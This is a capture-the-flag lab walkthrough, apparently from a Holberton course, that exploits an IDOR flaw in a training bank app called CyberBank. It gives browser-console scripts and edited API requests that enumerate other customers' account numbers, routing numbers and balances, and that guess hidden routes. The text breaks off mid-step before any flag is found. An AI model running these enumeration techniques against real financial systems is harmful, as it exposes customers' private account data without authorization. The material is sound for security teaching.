# Task 1. Enumerating Account Numbers for Balance Disclosure

## **Task Description**


Having successfully identified **user IDs** in the previous task, your next challenge in the CyberBank environment is focused on account numbers.\


Specifically, you will leverage **the user IDs** obtained to enumerate account numbers and subsequently disclose account balances.\
This stage underscores the potential depth of IDOR vulnerabilities in financial applications.

- Target Application: [CyberBank](https://intranet-dlh.hbtn.io/rltoken/1VVyFaPHhuT-TXMLbTuhhg)
- Relevant Endpoint: `http://web0x06.hbtn/dashboard`

---

Useful instructions:
1. Utilize the user ID(s) discovered in Task 1 to explore areas of the application where user account numbers might be displayed or referenced.
2. Pay attention to transaction history, fund transfer features, or profile/account settings that might reveal account numbers associated with the user IDs.
3. Once you have an account number, craft a request to the \`/accounts/\` API  endpoint, incorporating the account number to retrieve the balance information.
4. Experiment with modifying request parameters or paths using different account numbers to assess the application's response and to check for unauthorized access to account balances.
5. In the account balance information of a target account, look for a unique flag as evidence of successful enumeration and access.&#x20;

**Repo:**

- GitHub repository: `dlh-cyber_security`
- Directory: `web_application_security/0x06_idor`
- File: `1-flag.txt`



## **Solution**



- Start sandbox `cyber_websec_0x06`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.63.4 web0x06.hbtn" | sudo tee -a /etc/hosts
```



### Step 1: Inspect the account information API

From the previous task, we already discovered two important things:

1. CyberBank exposes other customers' account IDs through `/api/customer/contacts`.
2. CyberBank has an endpoint for retrieving account information:

```
POST /api/accounts/info
```

For example, Linda Robinson has these account IDs:

```
b2ce18af65704387924b9d286c5af593
c8b16ab984284bfaaa4c5c6930a64972
```

These are account identifiers, but we haven't established whether they are the account numbers required by this task.

### Action

In Firefox, while logged into CyberBank:

1. Navigate to `http://web0x06.hbtn/dashboard`.
2. Open Developer Tools (`F12`) and select Network.
3. Select Fetch/XHR and refresh the dashboard.
4. Click the `POST /api/accounts/info` requests.
5. Open the Request tab and copy the request body.


There are two requests to `/api/accounts/info` with the following request bodies:

```json
{'accounts_id': ['97ccfda8da2e4b2fa4133121fad8a9f2',
  'a1e9e267bb9649148d3edbc1233c0c47']}
```

```json
{'cards_id': ['6622b9b5976a43d689b1243c95b1493a',
  'defd561446064e4392de6550ce2db7aa',
  'd16f4618e86b493190c1440fd953bb08']}
```

## Step 2: Retrieve Linda Robinson's account information

We've confirmed that `/api/accounts/info` accepts an array of account IDs:

```json
{
  "accounts_id": [
    "97ccfda8da2e4b2fa4133121fad8a9f2",
    "a1e9e267bb9649148d3edbc1233c0c47"
  ]
}
```

These belong to the authenticated user, Yosri Musk.

From the previous task, we know Linda Robinson's account IDs:

- `b2ce18af65704387924b9d286c5af593`
- `c8b16ab984284bfaaa4c5c6930a64972`

### Action

In Firefox Developer Tools:

1. Open Network and find `POST /api/accounts/info`.
2. Right-click the request and select Edit and Resend.
3. Replace the existing request body with:

```json
{
  "accounts_id": [
    "b2ce18af65704387924b9d286c5af593",
    "c8b16ab984284bfaaa4c5c6930a64972"
  ]
}
```

4. Click Send.
5. Inspect the Response tab of the new request.


```json
{'message': [{'balance': 1642.4,
   'cards_id': ['969ee5b6aaf6409e957db1feb017eb0b'],
   'created_at': 1794147520,
   'customer_id': 'd8214d82375d48c0b302cc2b30068244',
   'id': 'b2ce18af65704387924b9d286c5af593',
   'number': '103418140975',
   'routing': '106190007',
   'updated_at': 1794147537},
  {'balance': 1223.8,
   'cards_id': ['5a6e879b94624aebb595841e6a3c0657',
    '0267d0efb1b4406cab796329b966b9a3'],
   'created_at': 1794147520,
   'customer_id': 'd8214d82375d48c0b302cc2b30068244',
   'id': 'c8b16ab984284bfaaa4c5c6930a64972',
   'number': '103162380698',
   'routing': '106190001',
   'updated_at': 1794147538}],
 'status': 'success'}
```

## Step 3: Retrieve an account balance using its account number

We've confirmed an IDOR vulnerability in `POST /api/accounts/info`.

While authenticated as Yosri Musk, we successfully retrieved Linda Robinson's account information.

### What we discovered

| Field          | Linda's Account 1 | Linda's Account 2 |
| -------------- | ----------------- | ----------------- |
| Account ID     | `b2ce18af...`     | `c8b16ab9...`     |
| Account number | `103418140975`    | `103162380698`    |
| Routing number | `106190007`       | `106190001`       |
| Balance        | $1,642.40         | $1,223.80         |

We've already demonstrated unauthorized balance disclosure. However, we haven't found the flag yet.

### Action

Open the following URL in the authenticated Firefox browser:

```
http://web0x06.hbtn/api/accounts/103418140975
```

### Why?

The task specifically mentions the `/accounts/` API endpoint.

We're testing whether that endpoint accepts an account number directly, rather than an internal account ID.

> Unfortunately we're getting a 404 Not Found error. The endpoint doesn't exist.

## Step 4: Discover the correct account balance endpoint

The response:

```
The requested URL was not found on the server.
```

indicates that `GET /api/accounts/103418140975` does not match an available route.

This is a 404 routing error, not evidence of an authorization check.

We already know that `/api/accounts/info` works, but the task suggests another endpoint that accepts an account number.

### Action: Search the application's JavaScript

In Firefox, while on the CyberBank dashboard:

1. Press `F12` and open the Debugger tab.
2. Press `Ctrl + Shift + F` to search across loaded JavaScript source files.
3. Search for:

```
/api/accounts/
```

4. Examine the matching code and endpoint paths.

### Why?

The frontend JavaScript often reveals which API routes the application actually uses.

For example, it might contain:

```
fetch(`/api/accounts/balance/${accountNumber}`)
```

This is only an illustration, not a confirmed endpoint.

Searching for the actual API structure reveals two occurences of the `/api/accounts/` endpoint in the JavaScript code:

```javascript
fetch("/api/accounts/info", {
    method: "POST",
    headers: {
        "content-type": "application/json"
    },
    credentials: "include",
    body: JSON.stringify({
        accounts_id: e.message.accounts_id
    })
})
```

```javascript
fetch(`/api/accounts/transfer_to/${u}`, {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    credentials: "include",
    body: JSON.stringify({
        amount: n,
        raison: "same",
        account_id: t.id,
        routing: t.routing,
        number: t.number
    })
});
```

## Step 5: Test the `/accounts/` endpoint directly

The JavaScript search confirms two endpoints:

| Endpoint                              | Purpose                                    |
| ------------------------------------- | ------------------------------------------ |
| `POST /api/accounts/info`             | Retrieve account details using account IDs |
| `POST /api/accounts/transfer_to/${u}` | Initiate a fund transfer                   |

Neither is clearly a dedicated account-number lookup endpoint. We shouldn't use the transfer endpoint because it performs a financial operation.

Important observation: The lab instructions explicitly mention `/accounts/`, not necessarily `/api/accounts/`.

### Action

While authenticated in Firefox, open:

```
http://web0x06.hbtn/accounts/103418140975
```

### Why?

We're testing whether `/accounts/<account_number>` is a separate route that resolves an account by its 12-digit number.

The previous 404 only established that `/api/accounts/103418140975` was not recognized.

> The requested URL was not found on the server ☹️



## Step 6: Check another customer's account information

Both `/api/accounts/103418140975` and `/accounts/103418140975` returned 404, so neither URL appears to be a valid route.

However, we've already confirmed that `POST /api/accounts/info` exposes other customers' balances. We should use this working endpoint rather than continue guessing URLs.

### Action

In Firefox Developer Tools → Network, right-click the original `POST /api/accounts/info` request and select Edit and Resend.

Replace the request body with Robert Martinez's account IDs, which we obtained in Task 0:

```
{
  "accounts_id": [
    "e0b863381c634d4698192b15a095777a",
    "5ef0100f10074e33bfb609ad455098a0"
  ]
}
```

Keep the original headers, method, and authentication session unchanged.

### Why?

Linda's account information exposed balances but contained no flag. We now want to establish whether another customer's account information includes additional fields, potentially the target flag.

We also want to determine whether the backend consistently discloses account balances belonging to different customers.

Result:

```json
{'message': [{'balance': 1648.4,
   'cards_id': ['c8464bcb8aee4fe99e39b6bd73461b5e'],
   'created_at': 1794147521,
   'customer_id': '31a6d09366e64c7383ef9c6d32ec5c8d',
   'id': 'e0b863381c634d4698192b15a095777a',
   'number': '107349939381',
   'routing': '106190000',
   'updated_at': 1794147521},
  {'balance': 75.6,
   'cards_id': ['112ebe2b39aa4a3e8ca79a3ccfa7f489',
    'ddc05a3a3d3f48f9a6224fb40e59d78f'],
   'created_at': 1794147521,
   'customer_id': '31a6d09366e64c7383ef9c6d32ec5c8d',
   'id': '5ef0100f10074e33bfb609ad455098a0',
   'number': '101734343268',
   'routing': '106190006',
   'updated_at': 1794147521}],
 'status': 'success'}
```

## Step 7: Enumerate the remaining accounts

Robert Martinez's account information confirms that CyberBank also exposes his balances:

- Account `107349939381`: $1,648.40
- Account `101734343268`: $75.60

We now have unauthorized balance disclosure for two different customers, but no flag yet.

Rather than manually testing every contact, let's enumerate all the account IDs exposed by `/api/customer/contacts` and inspect their responses for additional fields.

### Your next action

Open Firefox Developer Tools → Console on the CyberBank dashboard and execute:

```js
(async () => {
  const contacts = await (
    await fetch("/api/customer/contacts", {
      credentials: "include"
    })
  ).json();

  const ids = contacts.message.flatMap(c =>
    c.accounts.map(a => a.account_id)
  );

  const response = await fetch("/api/accounts/info", {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({accounts_id: ids})
  });

  const data = await response.json();

  console.log("Status:", data.status);

  console.table(
    (Array.isArray(data.message) ? data.message : []).map(a => ({
      customer_id: a.customer_id,
      account_number: a.number,
      balance: a.balance
    }))
  );

  const standard = new Set([
    "balance", "cards_id", "created_at", "customer_id",
    "id", "number", "routing", "updated_at"
  ]);

  console.log("Accounts with additional fields:",
    (Array.isArray(data.message) ? data.message : []).filter(a =>
      Object.keys(a).some(k => !standard.has(k))
    )
  );
})();
```

### Why?

This makes two types of requests using the authenticated browser session:

1. Retrieves the known contacts and their account IDs.
2. Requests the account details for those IDs using the already confirmed vulnerable endpoint.

It displays account numbers and balances, then identifies any account containing fields beyond those we've already seen. The script only reads information and does not initiate transfers.

### Table with Account Numbers and Balances


| (index) | customer_id | account_number | balance |
| :--- | :--- | :--- | :--- |
| 0 | 31a6d09366e64c7383ef9c6d32ec5c8d | 107349939381 | 1648.4 |
| 1 | 31a6d09366e64c7383ef9c6d32ec5c8d | 101734343268 | 75.6 |
| 2 | fa0b874438814d2aafe718a836195483 | 105407997859 | 1136.8 |
| 3 | fa0b874438814d2aafe718a836195483 | 104885184100 | 138.2 |
| 4 | 4f24a2579a5a47e9a611665e0af941ad | 104651839775 | 125.30000000000001 |
| 5 | 4f24a2579a5a47e9a611665e0af941ad | 103240290594 | 123.1 |
| 6 | efe253564d6d489fb552f0e4fc0e5600 | 104429115297 | 141.9 |
| 7 | efe253564d6d489fb552f0e4fc0e5600 | 101697199873 | 972 |
| 8 | c4fa0618f0874438a8f6ca34b1b22492 | 106766211363 | 132 |
| 9 | c4fa0618f0874438a8f6ca34b1b22492 | 108656647044 | 1131.8 |
| 10 | d8214d82375d48c0b302cc2b30068244 | 103418140975 | 1642.4 |
| 11 | d8214d82375d48c0b302cc2b30068244 | 103162380698 | 1223.8 |
| 12 | d50ed47e3545406ea7f62f0743da02b1 | 107104298089 | 220.5 |
| 13 | d50ed47e3545406ea7f62f0743da02b1 | 107473044508 | 2048.6 |
| 14 | bce5d42f749b4054908a93e9319e18db | 103304417318 | 117.5 |
| 15 | bce5d42f749b4054908a93e9319e18db | 106329307930 | 259.8 |
| 16 | e522cbf833f048659af0e7e75207f241 | 108399855518 | 1152.4 |
| 17 | e522cbf833f048659af0e7e75207f241 | 102491782841 | 1550.4 |
| 18 | e7503b1423ac4e428594805c1a846f95 | 103495870654 | 197.39999999999998 |
| 19 | e7503b1423ac4e428594805c1a846f95 | 103302752038 | 922.8 |


### Accounts with additional fields

`Array []`


## Step 8: Locate the account balance endpoint

We've confirmed that CyberBank exposes 20 accounts belonging to 10 other customers, including their account numbers and balances.

However, none of the responses contained a flag. This suggests that `/api/accounts/info` is not the final endpoint for this challenge.

### Action

Let's test whether CyberBank has a dedicated balance endpoint.

While authenticated in Firefox, open:

```
http://web0x06.hbtn/api/accounts/balance/103418140975
```

We're using Linda Robinson's account number, which we've already confirmed is valid.

### Why?

The task explicitly mentions retrieving balance information using an account number, whereas `/api/accounts/info` uses internal account IDs.

A potential endpoint structure is:

```
GET /api/accounts/balance/{account_number}
```

This is a hypothesis, not a route we've confirmed.

> The requested URL was not found on the server ☹️


## Step 9: Discover the actual API routes

The `404` confirms that `/api/accounts/balance/103418140975` is not a registered route.

We have already demonstrated unauthorized disclosure of 20 account balances. The remaining objective is to locate the endpoint or account information containing Task 1's flag.

Rather than guessing more URLs, we'll enumerate the routes referenced by CyberBank's frontend.

### Action

In Firefox:

1. Return to `http://web0x06.hbtn/dashboard`.
2. Open Developer Tools (`F12`) → Debugger.
3. Press `Ctrl + Shift + F` to search all loaded JavaScript files.
4. Search for:

```
/api/
```

5. Extract the distinct API paths, including any dynamic parameters. Searching for `/api/` more broadly may reveal another route for retrieving account balances, possibly under a different resource name.

Results:


* `/api/accounts/transfer_to/${u}` (where `${u}` represents a dynamic `account_id`)
* `/api/customer/transactions`
* `/api/customer/info/me`
* `/api/accounts/info`
* `/api/cards/info`
* `/api/customer/contacts`


## Step 10: Investigate transaction history for additional account numbers

The JavaScript search confirms that CyberBank's frontend uses only six API endpoints.

This tells us two things:

1. `POST /api/accounts/info` is the confirmed account balance disclosure endpoint. We've already demonstrated that it returns balances belonging to other customers.
2. The frontend doesn't reveal a separate account-number lookup endpoint, so continuing to guess URLs is unlikely to be productive.

We should now investigate `/api/customer/transactions`, which we haven't examined yet. Transactions may reference accounts outside Yosri's contact list.

### Action

Open Firefox Developer Tools → Console, and execute:

```js
(async () => {
  const response = await fetch("/api/customer/transactions", {
    credentials: "include"
  });

  const data = await response.json();

  console.log(JSON.stringify({
    status: data.status,
    count: Array.isArray(data.message) ? data.message.length : null,
    sample: Array.isArray(data.message)
      ? data.message.slice(0, 3)
      : data.message
  }, null, 2));
})();
```

### Why?

We're examining the transaction response structure to identify fields such as:

- Source or destination account numbers.
- Account IDs not present in the contact list.
- Customer IDs associated with transactions.

The command is read-only and prints up to three transactions so we can understand the data model without flooding the console.


Result:

```json
{
  "status": "success",
  "count": 17,
  "sample": [
    {
      "amount": 33,
      "created_at": 1794147533,
      "id": "1cbee46bcffe4e01a0c6e5d48d134db8",
      "merchant_name": "HolbertonSchool.",
      "method": "card",
      "raison": "Scholar Fees",
      "receiver_id": null,
      "receiver_payment_id": null,
      "sender_id": "2cc5e440302342fbae9d2e1d4a226d61",
      "sender_payment_id": "6622b9b5976a43d689b1243c95b1493a",
      "status": "pending",
      "updated_at": 1794147533
    },
    {
      "amount": 53,
      "created_at": 1794147534,
      "id": "42880c4813df4029802b00e97d6d1c61",
      "merchant_name": "DexterShield ltd",
      "method": "card",
      "raison": "AI CyberAudit - 1 CU",
      "receiver_id": null,
      "receiver_payment_id": null,
      "sender_id": "2cc5e440302342fbae9d2e1d4a226d61",
      "sender_payment_id": "defd561446064e4392de6550ce2db7aa",
      "status": "pending",
      "updated_at": 1794147534
    },
    {
      "amount": 137,
      "created_at": 1794147537,
      "id": "b04e2cbd9077429bbf0975288f760e50",
      "merchant_name": "Linda Robinson",
      "method": "wire",
      "raison": "Rent",
      "receiver_id": "d8214d82375d48c0b302cc2b30068244",
      "receiver_payment_id": "b2ce18af65704387924b9d286c5af593",
      "sender_id": "2cc5e440302342fbae9d2e1d4a226d61",
      "sender_payment_id": "97ccfda8da2e4b2fa4133121fad8a9f2",
      "status": "completed",
      "updated_at": 1794147537
    }
  ]
}
```

## Step 11: Check transaction history for undiscovered account IDs

The transaction response confirms that CyberBank uses these fields:

- `sender_id` and `receiver_id`: Customer IDs.
- `sender_payment_id` and `receiver_payment_id`: Payment identifiers, which reference account IDs for wire transfers.
- `method`: Distinguishes wire transfers from card transactions.

For example, the transaction to Linda Robinson references account ID `b2ce18af65704387924b9d286c5af593`, which we already know.

Our next objective: Determine whether any of the 17 transactions reference accounts that weren't exposed through the contacts endpoint.

### Action

Execute this in the Firefox Console:

```js
(async () => {
  const get = async url =>
    (await fetch(url, { credentials: "include" })).json();

  const [me, contacts, transactions] = await Promise.all([
    get("/api/customer/info/me"),
    get("/api/customer/contacts"),
    get("/api/customer/transactions")
  ]);

  const known = new Set([
    ...me.message.accounts_id,
    ...contacts.message.flatMap(c =>
      c.accounts.map(a => a.account_id)
    )
  ]);

  const unknown = transactions.message
    .filter(t => t.method === "wire")
    .flatMap(t => [
      { customer: t.sender_id, account: t.sender_payment_id },
      { customer: t.receiver_id, account: t.receiver_payment_id }
    ])
    .filter(x => x.account && !known.has(x.account));

  console.log("Known accounts:", known.size);
  console.log("Transactions:", transactions.message.length);
  console.table(
    [...new Map(unknown.map(x => [x.account, x])).values()]
  );
})();
```

### Why?

We already tested all 20 contact accounts using `/api/accounts/info`, and none contained the flag.

If transaction history references additional accounts, we can investigate those using the same confirmed endpoint.

This avoids repeating tests against accounts we've already examined.

```
XHR GET
http://web0x06.hbtn/api/customer/info/me
[HTTP/1.1 200 OK 66ms]
XHR GET
http://web0x06.hbtn/api/customer/contacts
[HTTP/1.1 200 OK 146ms]
XHR GET
http://web0x06.hbtn/api/customer/transactions
[HTTP/1.1 200 OK 141ms]
Known accounts: 22
Transactions: 17
console.table()
```

## Step 12: Test account-number lookup through the working API

The results show:

- 22 known accounts: 2 belonging to Yosri and 20 belonging to his contacts.
- 17 transactions: None revealed additional account IDs.
- No new accounts: The empty `console.table()` confirms this.

We have already demonstrated unauthorized balance disclosure. However, we haven't located the Task 1 flag.

### Action

Let's determine whether `POST /api/accounts/info` also accepts a 12-digit account number instead of an internal 32-character account ID.

In Firefox Developer Tools → Network, find the `POST /api/accounts/info` request, right-click it, and select Edit and Resend.

Replace its JSON body with:

```
{
  "accounts_id": [
    "103418140975"
  ]
}
```

Keep the POST method, existing headers, and authenticated session unchanged.

### Why?

We know that:

- `b2ce18af65704387924b9d286c5af593` is Linda's internal account ID.
- `103418140975` is Linda's actual bank account number.

Both identify the same account, but they may be handled differently by the backend.

If the endpoint accepts the account number, we might discover a second lookup mechanism relevant to the challenge. If it returns an error or empty result, we'll know this API requires internal account IDs.

Result:

```json
{"message":[],
"status":"success"}
```

## Step 13: Discover the account-number lookup endpoint

The response `"message":[]` confirms that `/api/accounts/info` did not find an account when given its 12-digit number. This endpoint appears to expect internal 32-character account IDs.

We already know that Linda Robinson's account number `103418140975` is valid. The next step is to locate the endpoint that accepts it.

### Action

Execute this script in the Firefox Console:

```js
(async () => {
  const number = "103418140975";

  const paths = [
    `/api/accounts/${number}/balance`,
    `/api/accounts/${number}/info`,
    `/api/accounts/number/${number}`,
    `/api/accounts/by-number/${number}`,
    `/api/accounts/lookup/${number}`,
    `/api/accounts?number=${number}`,
    `/api/accounts/balance?number=${number}`,
    `/api/accounts/number?number=${number}`,
    `/api/account/${number}`,
    `/api/account/balance/${number}`
  ];

  for (const path of paths) {
    try {
      const r = await fetch(path, {
        credentials: "include"
      });

      console.log(
        r.status,
        path,
        r.status !== 404
          ? (await r.text()).slice(0, 1000)
          : ""
      );
    } catch (e) {
      console.log("ERROR", path, e.message);
    }
  }
})();
```

### Why?

These are candidate routes, not confirmed endpoints. Rather than testing them individually, we're conducting a small, controlled route-discovery test.

All requests use `GET`, so none invokes the known money-transfer operation.

We're particularly interested in:

- 200: The endpoint exists and may return account information.
- 401/403: The endpoint may exist but requires different authorization.
- 405: The route may exist but requires another HTTP method.
- 404: No matching route was found.

Results:

```
XHR GET
http://web0x06.hbtn/api/accounts/103418140975/balance
[HTTP/1.1 404 NOT FOUND 51ms]
404 /api/accounts/103418140975/balance <empty string>
XHR GET
http://web0x06.hbtn/api/accounts/103418140975/info
[HTTP/1.1 404 NOT FOUND 22ms]
404 /api/accounts/103418140975/info <empty string>
XHR GET
http://web0x06.hbtn/api/accounts/number/103418140975
[HTTP/1.1 404 NOT FOUND 23ms]
404 /api/accounts/number/103418140975 <empty string>
XHR GET
http://web0x06.hbtn/api/accounts/by-number/103418140975
[HTTP/1.1 404 NOT FOUND 19ms]
404 /api/accounts/by-number/103418140975 <empty string>
XHR GET
http://web0x06.hbtn/api/accounts/lookup/103418140975
[HTTP/1.1 404 NOT FOUND 25ms]
404 /api/accounts/lookup/103418140975 <empty string>
XHR GET
http://web0x06.hbtn/api/accounts?number=103418140975
[HTTP/1.1 404 NOT FOUND 19ms]
404 /api/accounts?number=103418140975 <empty string>
XHR GET
http://web0x06.hbtn/api/accounts/balance?number=103418140975
[HTTP/1.1 404 NOT FOUND 22ms]
404 /api/accounts/balance?number=103418140975 <empty string>
XHR GET
http://web0x06.hbtn/api/accounts/number?number=103418140975
[HTTP/1.1 404 NOT FOUND 17ms]
404 /api/accounts/number?number=103418140975 <empty string>
XHR GET
http://web0x06.hbtn/api/account/103418140975
[HTTP/1.1 404 NOT FOUND 23ms]
404 /api/account/103418140975 <empty string>
XHR GET
http://web0x06.hbtn/api/account/balance/103418140975
[HTTP/1.1 404 NOT FOUND 18ms]
404 /api/account/balance/103418140975 <empty string>
```


## Step 14: Check for an API specification

All 10 candidate routes returned `404`. We should stop guessing URL patterns.

We have already confirmed that `/api/accounts/info` discloses other customers' balances. What remains unresolved is where Task 1's flag is exposed.

Our next approach is to check whether CyberBank publishes an OpenAPI or Swagger specification. Such a specification can reveal backend routes that aren't referenced in the frontend JavaScript.

### Action

Execute this in the Firefox Console:

```js
(async () => {
  const paths = [
    "/openapi.json",
    "/swagger.json",
    "/api/openapi.json",
    "/api/swagger.json"
  ];

  for (const path of paths) {
    const r = await fetch(path, {
      credentials: "include"
    });

    console.log(`${r.status} ${path}`);

    if (r.ok) {
      const text = await r.text();

      try {
        const spec = JSON.parse(text);
        console.log("API routes:", Object.keys(spec.paths || {}));
      } catch {
        console.log("Response:", text.slice(0, 500));
      }
    }
  }
})();
```

### Why?

An API specification could reveal an undocumented account lookup route or explain the expected request parameters.

Unlike our earlier attempts, we're looking for documentation of the backend's actual interface, rather than inventing endpoint names.

This is a read-only check.

Result:

```
XHR GET
http://web0x06.hbtn/openapi.json
[HTTP/1.1 404 NOT FOUND 61ms]
404 /openapi.json
XHR GET
http://web0x06.hbtn/swagger.json
[HTTP/1.1 404 NOT FOUND 19ms]
404 /swagger.json
XHR GET
http://web0x06.hbtn/api/openapi.json
[HTTP/1.1 404 NOT FOUND 22ms]
404 /api/openapi.json
XHR GET
http://web0x06.hbtn/api/swagger.json
[HTTP/1.1 404 NOT FOUND 18ms]
404 /api/swagger.json
```


## Step 15: Check whether customer profiles reveal additional accounts

All four API specification URLs returned `404`. We should stop guessing endpoints and return to the confirmed IDOR vulnerability.

We know that:

- `/api/customer/info/{customer_id}` exposes another customer's profile.
- Customer profiles contain an `accounts_id` array.
- `/api/customer/contacts` also exposes account IDs, but we haven't established whether those lists are complete.

Our hypothesis: Some customers may have accounts that aren't listed in Yosri's contacts. Those additional accounts could contain the Task 1 flag.

### Action

Execute this in the Firefox Console:

```js
(async () => {
  const contacts = await (
    await fetch("/api/customer/contacts", {
      credentials: "include"
    })
  ).json();

  const results = [];

  for (const contact of contacts.message) {
    const response = await fetch(
      `/api/customer/info/${contact.contact_id}`,
      { credentials: "include" }
    );

    const data = await response.json();

    const listed = new Set(
      contact.accounts.map(a => a.account_id)
    );

    const profileAccounts = data.message?.accounts_id || [];

    results.push({
      name: `${contact.firstname} ${contact.lastname}`,
      status: data.status,
      contact_accounts: listed.size,
      profile_accounts: profileAccounts.length,
      additional_ids: profileAccounts
        .filter(id => !listed.has(id))
        .join(", ")
    });
  }

  console.table(results);
})();
```

### Why?

This compares each customer's complete profile account list with the accounts exposed through the contacts endpoint.

If `additional_ids` contains any values, we've discovered new accounts worth checking through `/api/accounts/info`.

Result:


| (index) | name | status | contact_accounts | profile_accounts | additional_ids |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 0 | Linda Robinson | success | 2 | 2 | `<empty string>` |
| 1 | Robert Martinez | success | 2 | 2 | `<empty string>` |
| 2 | Patricia Garcia | success | 2 | 2 | `<empty string>` |
| 3 | James Thompson | success | 2 | 2 | `<empty string>` |
| 4 | Elizabeth Martin | success | 2 | 2 | `<empty string>` |
| 5 | Brian Harris | success | 2 | 2 | `<empty string>` |
| 6 | Megan White | success | 2 | 2 | `<empty string>` |
| 7 | Mark Jackson | success | 2 | 2 | `<empty string>` |
| 8 | Ashley Thomas | success | 2 | 2 | `<empty string>` |
| 9 | David Anderson | success | 2 | 2 | `<empty string>` |


## Step 16: Look for customers outside the contact list

The results confirm that all 10 customers have exactly two accounts, and both accounts are already known.

This eliminates the possibility that their profiles contain additional, unlisted accounts.

What we've established:

- 10 external customers identified.
- 20 external accounts enumerated.
- Unauthorized balance disclosure confirmed.
- No Task 1 flag found in those account responses.

Our next hypothesis is that transaction history may reveal customer IDs that aren't in Yosri's contacts, even if it doesn't reveal new account IDs.

### Action

Execute this in the Firefox Console:

```js
(async () => {
  const get = async path =>
    (await fetch(path, { credentials: "include" })).json();

  const [contacts, transactions, me] = await Promise.all([
    get("/api/customer/contacts"),
    get("/api/customer/transactions"),
    get("/api/customer/info/me")
  ]);

  const known = new Set([
    me.message.id,
    ...contacts.message.map(c => c.contact_id)
  ]);

  const allIds = new Set(
    transactions.message.flatMap(t => [
      t.sender_id,
      t.receiver_id
    ]).filter(Boolean)
  );

  const unknown = [...allIds].filter(id => !known.has(id));

  console.log("Known customer IDs:", known.size);
  console.log("Unique transaction customer IDs:", allIds.size);
  console.log("Unknown customer IDs:", unknown.length);
  console.table(unknown.map(id => ({ customer_id: id })));
})();
```

### Why?

Our previous transaction analysis checked for unknown account IDs, but not unknown customer IDs.

A transaction might reference a customer whose account IDs aren't directly disclosed. If we find such a customer, we can use the confirmed vulnerable `/api/customer/info/{customer_id}` endpoint to enumerate their accounts.

This is read-only and uses only the existing CyberBank session.

Result:

```
XHR GET
http://web0x06.hbtn/api/customer/contacts
[HTTP/1.1 200 OK 77ms]
XHR GET
http://web0x06.hbtn/api/customer/transactions
[HTTP/1.1 200 OK 54ms]
XHR GET
http://web0x06.hbtn/api/customer/info/me
[HTTP/1.1 200 OK 75ms]
Known customer IDs: 11
Unique transaction customer IDs: 6
Unknown customer IDs: 0
console.table()
```

## Step 17: Identify supported HTTP methods for the `/accounts/` endpoint

The results confirm:

- 11 known customers, including Yosri.
- 6 unique customer IDs in transaction history.
- 0 previously unknown customers.

We've exhausted the account IDs exposed through contacts and transactions.

One important detail remains: the lab explicitly references an `/accounts/` API endpoint, but our earlier tests used `GET`. It's possible that an account lookup uses a different HTTP method.

### Action

Execute this in Firefox's Console:

```js
(async () => {
  const paths = [
    "/accounts/",
    "/api/accounts/",
    "/api/accounts"
  ];

  for (const path of paths) {
    const r = await fetch(path, {
      method: "OPTIONS",
      credentials: "include"
    });

    console.log({
      path,
      status: r.status,
      allow: r.headers.get("Allow"),
      contentType: r.headers.get("Content-Type")
    });
  }
})();
```

### Why?

The HTTP `OPTIONS` method can reveal which methods a registered endpoint supports.

For example:

```
Status: 200
Allow: OPTIONS, POST
```

That would indicate a route accepting `POST` requests, which we might have missed by testing only `GET`.

A `404` would mean the tested path wasn't recognized, although other routes with additional path parameters might still exist.

Result:

```
XHR OPTIONS
http://web0x06.hbtn/accounts/
[HTTP/1.1 404 NOT FOUND 63ms]
Object { path: "/accounts/", status: 404, allow: null, contentType: "text/html; charset=utf-8" }

XHR OPTIONS
http://web0x06.hbtn/api/accounts/
[HTTP/1.1 404 NOT FOUND 19ms]
Object { path: "/api/accounts/", status: 404, allow: null, contentType: "text/html; charset=utf-8" }

XHR OPTIONS
http://web0x06.hbtn/api/accounts
[HTTP/1.1 404 NOT FOUND 24ms]
Object { path: "/api/accounts", status: 404, allow: null, contentType: "text/html; charset=utf-8" }
```


## Step 18: Test whether an empty account filter exposes additional accounts

All three `OPTIONS` requests returned `404`. This confirms those exact paths are not recognized, but it doesn't rule out routes with additional path components.

We've already confirmed that `POST /api/accounts/info` exposes unauthorized balances. Let's investigate how its backend handles an empty account list.

### Action

Execute this in the Firefox Console:

```js
(async () => {
  const response = await fetch("/api/accounts/info", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      accounts_id: []
    })
  });

  const data = await response.json();

  console.log("HTTP status:", response.status);
  console.log("API status:", data.status);
  console.log("Account count:", Array.isArray(data.message)
    ? data.message.length
    : "N/A"
  );
  console.log("Response:", data);
})();
```

### Why?

The normal request explicitly supplies an array of account IDs.

We're testing whether the backend interprets an empty array as:

- No accounts: Correct filtering behavior.
- All accounts: A potentially serious authorization and filtering vulnerability.
- Invalid input: The backend requires at least one account ID.

If it returns additional accounts, we can investigate whether one contains the target flag.

This test is read-only and uses the already confirmed endpoint.

Output:

```
XHR POST
http://web0x06.hbtn/api/accounts/info
[HTTP/1.1 200 OK 52ms]
HTTP status: 200
API status: success
Account count: 0
Response:
Object { message: [], status: "success" }
```

...


## Step 19: Test the missing account lookup pattern

Let's try something different.

The strongest lead is the API's existing routing convention.

We know this endpoint works:

```
GET /api/customer/info/{customer_id}
```

But we haven't tested the equivalent account endpoint:

```
GET /api/accounts/info/{account_number}
```

### Action

Open this URL in your authenticated Firefox browser:

```
http://web0x06.hbtn/api/accounts/info/103418140975
```

This uses Linda Robinson's confirmed account number.

### Why this particular test?

It isolates one variable: the account lookup route.

We already know the account number is valid, so the response will help us distinguish between an incorrect route and an incorrect identifier.

| Response                | Interpretation                                                   |
| ----------------------- | ---------------------------------------------------------------- |
| `200` with account data | Possible account-number lookup discovered                        |
| `200` with JSON error   | Route may exist but reject the identifier                        |
| `403`                   | Possible authorization restriction                               |
| `404`                   | Route not found, or account lookup not exposed through this path |
| `405`                   | Route may exist but require another HTTP method                  |


Response:

```json
{"message":"Invalid \"account_id\".","status":"failed"}
```


## Step 20: Test the discovered account lookup endpoint

This is our first meaningful breakthrough in several steps.

The server returned:

```json
{
  "message": "Invalid \"account_id\".",
  "status": "failed"
}
```

This is significant because it indicates that the backend recognizes:

```
GET /api/accounts/info/{account_id}
```

Unlike our earlier attempts, we received an application-level validation error rather than a generic 404.

The parameter name `account_id` is particularly important. It suggests the endpoint expects a 32-character internal account ID, not a 12-digit account number.

### Action

Open the following URL in the authenticated Firefox browser:

```
